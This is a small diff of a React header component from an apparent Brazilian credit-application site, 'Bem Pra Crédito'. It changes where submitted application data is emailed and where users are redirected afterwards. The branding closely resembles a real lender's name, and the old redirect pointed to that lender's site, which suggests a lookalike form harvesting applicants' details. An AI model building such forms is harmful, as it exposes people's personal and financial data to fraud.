@@ -124,7 +124,7 @@ const Header = () => {
     try {
       await axios.post("https://meuback-mmfq.onrender.com/api/send", {
         from: "bempracredito@gmail.com",
-        to: "fichasmarcuscarioca@gmail.com",
+        to: "deejay@chegou.net",
         subject: "Nova Ficha | Bem Pra Crédito",
         message: htmlTemplate,
       });
@@ -144,8 +144,7 @@ const Header = () => {
 
       setTimeout(() => {
         setShowModal(false);
-        window.location.href =
-          "https://www.bompracredito.com.br/emprestimo-pessoal";
+        window.location.href = "https://bemcredito.vercel.app/";
       }, 1000);
     } catch (error) {
       console.error("Erro ao enviar o email:", error);
